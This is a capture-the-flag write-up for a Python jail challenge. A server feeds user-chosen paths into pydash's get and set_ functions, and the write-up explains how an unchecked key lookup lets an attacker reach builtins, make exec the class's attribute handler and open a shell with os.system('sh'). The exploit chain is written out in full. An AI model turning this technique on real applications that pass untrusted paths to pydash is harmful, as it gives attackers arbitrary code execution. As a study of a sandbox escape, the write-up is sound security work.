# get and set

## challenge

Dockerfile
```dockerfile
FROM ubuntu:22.04 as chroot

RUN /usr/sbin/useradd --no-create-home -u 1000 user
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -y; apt-get install python3 python3-pip -y
RUN pip3 install pydash

COPY server.py /home/user/chal
COPY flag.txt /home/user/flag.txt

RUN chmod 555 /home/user/chal

FROM gcr.io/kctf-docker/challenge@sha256:d884e54146b71baf91603d5b73e563eaffc5a42d494b1e32341a5f76363060fb

COPY --from=chroot / /chroot

COPY nsjail.cfg /home/user/

CMD kctf_setup && \
    kctf_drop_privs \
    socat \
      TCP-LISTEN:1337,reuseaddr,fork \
      EXEC:"kctf_pow nsjail --config /home/user/nsjail.cfg -- /home/user/chal"
```

```
name: "default-nsjail-configuration"
description: "Default nsjail configuration for pwnable-style CTF task."

mode: ONCE
uidmap {inside_id: "1000"}
gidmap {inside_id: "1000"}
rlimit_as_type: HARD
rlimit_cpu_type: HARD
rlimit_nofile_type: HARD
rlimit_nproc_type: HARD

cwd: "/home/user"

mount: [
  {
    src: "/chroot"
    dst: "/"
    is_bind: true
  },
  {
    dst: "/tmp"
    fstype: "tmpfs"
    rw: true
  },
  {
    dst: "/proc"
    fstype: "proc"
    rw: true
  },
  {
    src: "/etc/resolv.conf"
    dst: "/etc/resolv.conf"
    is_bind: true
  }
]
```

server.py
```py
#!/usr/bin/env python3
import pydash


class Dummy:
    pass


if __name__ == "__main__":
    obj = Dummy()
    while True:
        src = input("src: ")
        dst = input("dst: ")
        pydash.set_(obj, dst, pydash.get(obj, src))
```

## solution

looking at the pydash source code, `get` fn is implemented as below

```
def get(obj: t.Any, path: PathT, default: t.Any = None) -> t.Any:
    if default is UNSET:
        # When NoValue given for default, then this method will raise if path is not present in obj.
        sentinel = default
    else:
        # When a returnable default is given, use a sentinel value to detect when base_get() returns
        # a default value for a missing path, so we can exit early from the loop and not mistakenly
        # iterate over the default.
        sentinel = object()

    for key in to_path(path):
        obj = base_get(obj, key, default=sentinel)

        if obj is sentinel:
            # Path doesn't exist so set return obj to the default.
            obj = default
            break

    return obj
```

these use `base_get`, which uses the two functions below

```py
def _base_get_item(obj, key, default=UNSET):
    try:
        return obj[key]
    except Exception:
        pass

    if not isinstance(key, int):
        try:
            return obj[int(key)]
        except Exception:
            pass

    return default


def _base_get_object(obj, key, default=UNSET):
    value = _base_get_item(obj, key, default=UNSET)
    if value is UNSET:
        _raise_if_restricted_key(key)
        value = default
        try:
            value = getattr(obj, key)
        except Exception:
            pass
    return value
```

the raise_if_restricted_key prevents accessing `obj.__globals__` and `obj.__builtins__` from _base_get_object, but, importantly, this restriction is not present in _base_get_item

first, the important thing is that we cant call any functions so easily

one idea is to overwrite the `__getitem__` (called when `obj[key]`). however, this cannot be done straight up (see [here](https://stackoverflow.com/questions/57413453/is-it-possible-to-override-getitem-at-instance-level-in-python))

![image](https://github.com/quasar098/pyjail-collection/assets/70716985/faddba52-aec1-4109-b92d-013d8805996f)

however, we can overwrite the Dummy class's `__class_getitem__`. that way, we can call the functions by doing `Dummy[key]` in place of `fn(key)`

so what function to call?

well, we can use `__reduce_ex__` since that takes one argument, and it returns a tuple that contains a function `__newobj__` to get a function object

so, `obj.__class__.__class_getitem__ = obj.__reduce_ex__`

then, we can use `obj.__class_[3]` to call `obj.__reduce_ex__(3)`

now, we have a function at the 0th index of the function return value. so, we can set getitem to that again

now, we can get the builtins because there is no restriction for getattr

then, we can set the getattr of the Dummy class to be exec.

now, we can just get an attribute that is actually a malicious piece of code.

essentially, the solution is
```
obj.__class__.__class_getitem__ = obj.__reduce_ex__
obj.newobj = obj.__class__[3][0]
obj.__class__.__class_getitem__ = obj.newobj.__getattribute__
__class__.__getattr__ = obj.__class__['__builtins__'].exec
getattr(obj, "import os; os\.system('sh')")
```
